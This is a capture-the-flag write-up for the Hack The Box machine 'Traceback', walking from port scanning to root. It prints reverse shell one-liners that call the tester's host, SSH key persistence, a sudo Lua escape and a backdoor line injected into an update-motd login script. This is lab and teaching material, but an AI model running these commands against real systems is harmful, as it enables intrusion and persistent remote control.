# Traceback

## OS: Linux

## IP: 10.10.10.181

### Enumeration

```bash
$ nmap -sCV -vvv -oA traceback-nmap 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-04 10:21 CDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 0.00s elapsed
Initiating Ping Scan at 10:21
Scanning 10.10.10.181 [2 ports]
Completed Ping Scan at 10:21, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:21
Completed Parallel DNS resolution of 1 host. at 10:21, 0.06s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:21
Scanning 10.10.10.181 [1000 ports]
Discovered open port 80/tcp on 10.10.10.181
Discovered open port 22/tcp on 10.10.10.181
Completed Connect Scan at 10:21, 0.73s elapsed (1000 total ports)
Initiating Service scan at 10:21
Scanning 2 services on 10.10.10.181
Completed Service scan at 10:21, 6.11s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.181.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 1.64s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 0.19s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 0.00s elapsed
Nmap scan report for 10.10.10.181
Host is up, received syn-ack (0.049s latency).
Scanned at 2020-04-04 10:21:27 CDT for 9s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbMNfxYPZGAdOf2OAbwXhXDi43/QOeh5OwK7Me/l15Bej9yfkZwuLhyslDCYIvi4fh/2ZxB0MecNYHM+Sf4xR/CqPgIjQ+NuyAPI/c9iXDDhzJ+HShRR5WIqsqBHwtsQFrcQXcfQFYlC+NFj5ro9wfl2+UvDO6srTUxl+GaaabePYm2u0mlmfwHqlaQaB8HOUb436IdavyTdvpW7LTz4qKASrCTPaawigDymMEQTRYXY4vSemIGMD1JbfpErh0mrFt0Hu12dmL6LrqNmUcbakxOXvZATisHU5TloxqH/p2iWJSwFi/g0YyR2JZnIB65fGTLjIhZsOohtSG7vrPk+cZ
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2jCEklOC94CKIBj9Lguh3lmTWDFYq41QkI5AtFSx7x+8uOCGaFTqTwphwmfkwZTHL1pzOMoJTrGAN8T7LA2j0=
|   256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL4LOW9SgPQeTZubVmd+RsoO3fhSjRSWjps7UtHOc10p
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:21
Completed NSE at 10:21, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.18 seconds
```

Just ports `22` and `80` are open. Navigating to the website shows this message:

```
This site has been owned
I have left a backdoor for all the net. FREE INTERNETZZZ
- Xh4H -
```

Let's run `gobuster` on it to see what other directories are accessible.

```bash
$ gobuster dir -u http://staging-order.mango.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-root.log --wildcard -t 40

/server-status (Status: 403)
```

Ok, nothing much there. There's a comment in the HTML source that's interesting: `<!--Some of the best web shells that you might need ;)-->`. Googling this brings me to [this](https://github.com/TheBinitGhimire/Web-Shells) repo. I cloned this repo and threw together a list of all of the shells with `$ ls > shells.txt`, and ran `gobuster` on the website again.


```bash
$ gobuster dir -u http://10.10.10.181 -w webshells-php.txt -o gobuster-root.log --wildcard -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.181
[+] Threads:        40
[+] Wordlist:       shells.php
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/04 12:24:51 Starting gobuster
===============================================================
/smevk.php (Status: 200)
===============================================================
2020/04/04 12:24:55 Finished
===============================================================
```

It looks like a stray webshell is still available on the server. Navigating to `http://10.10.10.181/smevk.php` shows me a webshell login page.

First, we try to use `sqlmap` to find any `SQL` vulnerabilities. Intercept a login request with Burp, save it to a file and then run `$ sqlmap -r login.req`. But injection failed for all three parameters... Nothing there.

Let's check out the source code for the webshell we found in the GitHub repo.

```php
...
$UserName = "admin";                                     //Your UserName here.
$auth_pass = "admin";                                    //Your Password.
...
```

Let's see if the `admin`:`admin` combination works? And it does. After logging in to the webshell admin page, we see an interface for administrating the system. I navigate to `/home/sysadmin` after running `$ whoami` to figure out which user I was logged in as. Listing the directory contents shows me a `note.txt` file which contains the following:

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Let's see if we can grab a real shell and start working. I start a listener with `$ nc -lvnp 1234` and then run `$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f` on the administration page and see a shell get picked up by my listener.

### Upgrading Shell

```bash
# Since python is missing from the system, we have to use python3
$ python3 -c 'import pty;pty.spawn("/bin/bash");'
# Ctrl-Z to background shell.
$ stty size
$ stty raw -echo; fg
$ reset
$ export TERM=xterm-256color
$ export SHELL=bash
$ stty rows 53 columns 104 # From $ stty size
$ clear
```

## Privilege Escalation

I spin up a python webserver and use `wget` on the remote machine to copy `LinEnum.sh` over. I make it executable and run it, saving the output to be copied back over to my local machine. The full scan can be found at `enumeration/LinEnumReport.txt`. The most interesting line in the output is:

```
[+] We can sudo without supplying a password!
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

Let's take another look at this home directory.

```bash
webadmin@traceback:/home/webadmin$ ls -lah
total 44K
drwxr-x--- 5 webadmin sysadmin 4.0K Mar 16 04:03 .
drwxr-xr-x 4 root     root     4.0K Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3.7K Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4.0K Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4.0K Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4.0K Feb 27 06:29 .ssh
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
webadmin@traceback:/home/webadmin$ cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
rm privesc.lua
logout
```

So we know we have the privileges to run `/home/sysadmin/luvit` and it gets executed as `sysadmin`. I guess it's time to learn some `lua`...

We want to read the file `/home/sysadmin/user.txt`. This should do it:

```lua
local file = io.open( "/home/sysadmin/user.txt", "r" )
local contents = file:read("*all")
print(contents)
file:close()
```

We create this file using `nano` and save it to `userflag.lua`, and then run it:

```bash
webadmin@traceback:/home/webadmin$ sudo -u sysadmin /home/sysadmin/luvit userflag.lua
8f3d*********************
```

That's our user proof. Now we need to do a `root` privesc.

First, let's spawn a shell as `sysadmin` with a similar `lua` trick. Create a new `lua` file containing `os.execute("/bin/bash")` and run it with `$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua`. You'll now see a bash prompt showing you're logged in as sysadmin.

```bash
sysadmin@traceback:/home/webadmin$ whoami
sysadmin
```

Now, let's take a look at the processes running on the system. I spin up another python server and move over `pspy`.

```bash
...
2020/04/04 12:16:01 CMD: UID=0    PID=39185  | /usr/sbin/CRON -f
2020/04/04 12:16:31 CMD: UID=0    PID=39191  | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/
...
```

These two lines are particularly interesting.

`motd` stands for *Message of the Day*, and is shown when logging in over `ssh`. In order to trigger anything relating to the `motd` files, we need to be able to `ssh` in. On my Kali machine, I generate a new `ssh` key and add the public key to the `~/.ssh/authorized_keys` file on the target machine.

```bash
$ ssh-keygen -t rsa -b 4096 -C "traceback-ssh-key"
Generating public/private rsa key pair.
Enter file in which to save the key (/home/alichtman/.ssh/id_rsa): /home/alichtman/.ssh/traceback-htb
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/alichtman/.ssh/traceback-htb
Your public key has been saved in /home/alichtman/.ssh/traceback-htb.pub
The key fingerprint is:
SHA256:CX6ZZHcZRaeFqfZauDwXIpTqn5liLI5c2GWZqO6uXvk traceback-ssh-key
The key's randomart image is:
+---[RSA 4096]----+
|            .oooo|
|             oo+ |
|      . o ..o..  |
|     . = Bo.o    |
|      o So . o   |
|     = +. . o +  |
|    = oo   o = . |
|   + +. =  += .  |
| .o+*.Eo o=  o   |
+----[SHA256]-----+

$ cat /home/alichtman/.ssh/traceback-htb.pub | yank
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDG0s0g8bEpYXRCFrB3ps8alPAE3bKRqb3sqf1hD9zsVxJZNQZARTEc8zatZjU4jXYbyl2B40YNWd4TQHp7QDnJWb1vRIm8v4FL9Lt8zB2U9PC79cOgnDG+JjDQgREHSQxEdj7W9Cp0zZzYPlPLrZJSywunKA9KGskjGfmT6EuPbpszQr7pb/UeTORZqOWfSwG2iNapgXvGCgnMIS50jAlNiQCX6JxflVGXyBoq3LstB5HRE8MQIX/WacSrWj6gpkJ2W4yoJQ8qHSOS6KMyZDm/0ISEEqd1s1vvkiNwhdn9HuH6XygFeNXIuF+BubQlRnM6W/0twCoDdK7h6b7/fS8JKQrdBUmZabUt39LmalOYHU3x/21LLnjuycyFUzxHRRjikG9RJw6l/QQ4fF+pz7VBB9vIU3TZnk0cUuVZR6TickUjUEiR5skg9mFPOfYjEYn9VUTe5UFZYxvN391S87q13aiFtlWLmGOMXg8o2PFcavoSiow1HIUMb9znrQMDPxWsAxsq8zx7t5IX7yScSlu/ZnweeKXZS3AKHw/qzx7JSjVsERDDgIQHEGThBshf7ugMB/kxm/8WG7yOvWY03PmNo2gS7TXsrYQdMc78bXUvnKo7DJ5SVWwKhJMSRMRXV9nDKOUOtwrB9MS3fz5O+c7Dl2fKbKfyLzkpdU19WQJOSw== traceback-ssh-key

$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDG0s0g8bEpYXRCFrB3ps8alPAE3bKRqb3sqf1hD9zsVxJZNQZARTEc8zatZjU4jXYbyl2B40YNWd4TQHp7QDnJWb1vRIm8v4FL9Lt8zB2U9PC79cOgnDG+JjDQgREHSQxEdj7W9Cp0zZzYPlPLrZJSywunKA9KGskjGfmT6EuPbpszQr7pb/UeTORZqOWfSwG2iNapgXvGCgnMIS50jAlNiQCX6JxflVGXyBoq3LstB5HRE8MQIX/WacSrWj6gpkJ2W4yoJQ8qHSOS6KMyZDm/0ISEEqd1s1vvkiNwhdn9HuH6XygFeNXIuF+BubQlRnM6W/0twCoDdK7h6b7/fS8JKQrdBUmZabUt39LmalOYHU3x/21LLnjuycyFUzxHRRjikG9RJw6l/QQ4fF+pz7VBB9vIU3TZnk0cUuVZR6TickUjUEiR5skg9mFPOfYjEYn9VUTe5UFZYxvN391S87q13aiFtlWLmGOMXg8o2PFcavoSiow1HIUMb9znrQMDPxWsAxsq8zx7t5IX7yScSlu/ZnweeKXZS3AKHw/qzx7JSjVsERDDgIQHEGThBshf7ugMB/kxm/8WG7yOvWY03PmNo2gS7TXsrYQdMc78bXUvnKo7DJ5SVWwKhJMSRMRXV9nDKOUOtwrB9MS3fz5O+c7Dl2fKbKfyLzkpdU19WQJOSw== traceback-ssh-key" >> ~/.ssh/authorized_keys
```

Then I want to test that I can `ssh` in to the machine successfully.

```bash
$ ssh sysadmin@10.10.10.181 -i ~/.ssh/traceback-htb
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land

Last login: Mon Mar 16 03:50:24 2020 from 10.10.14.2
$
```

Great. Let's see if we can pop a root shell with this.

```bash
sysadmin@traceback:/etc/update-motd.d$ ll
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 ./
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ../
-rwxrwxr-x  1 root sysadmin  981 Apr  4 13:35 00-header*
-rwxrwxr-x  1 root sysadmin  982 Apr  4 13:35 10-help-text*
-rwxrwxr-x  1 root sysadmin 4264 Apr  4 13:35 50-motd-news*
-rwxrwxr-x  1 root sysadmin  604 Apr  4 13:35 80-esm*
-rwxrwxr-x  1 root sysadmin  299 Apr  4 13:35 91-release-upgrade*
sysadmin@traceback:/etc/update-motd.d$ cat 91-release-upgrade
#!/bin/sh

# if the current release is under development there won't be a new one
if [ "$(lsb_release -sd | cut -d' ' -f4)" = "(development" ]; then
    exit 0
fi
if [ -x /usr/lib/ubuntu-release-upgrader/release-upgrade-motd ]; then
    exec /usr/lib/ubuntu-release-upgrader/release-upgrade-motd
fi
```

So, all of the files in `/etc/update-motd.d/` have permissions `755`, and `91-release-upgrade` is a shell script that I believe gets executed on login. We know that it's overwritten on a regular basis from the `pspy` output above, but it's possible that we could add a line to the `91-release-upgrade` file that throws a root reverse shell to a listener we have running and ssh in to trigger it before it's overwritten.

Let's create a `nc` listener (on a different port from the last `nc` listener, as that's holding our connection open): `$ nc -lvnp 1235`.

And since the `91-release-upgrade` script uses a `/bin/sh` interpreter, we need a `sh` based reverse shell: `$ rm /tmp/e;mkfifo /tmp/e;cat /tmp/e|/bin/sh -i 2>&1|nc 10.10.14.8 1235 >/tmp/e`

Pasting that line in to the `/etc/update-motd.d/91-release-upgrade` file on the remote system and then running `$ ssh sysadmin@10.10.10.181 -i ~/.ssh/traceback-htb` from my Kali box gives me a root shell on the listener I set up.

```bash
$ nc -lvnp 1235
listening on [any] 1235 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.181] 48562
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# wc /root/root.txt
 1  1 33 /root/root.txt
```

And there's the root proof.
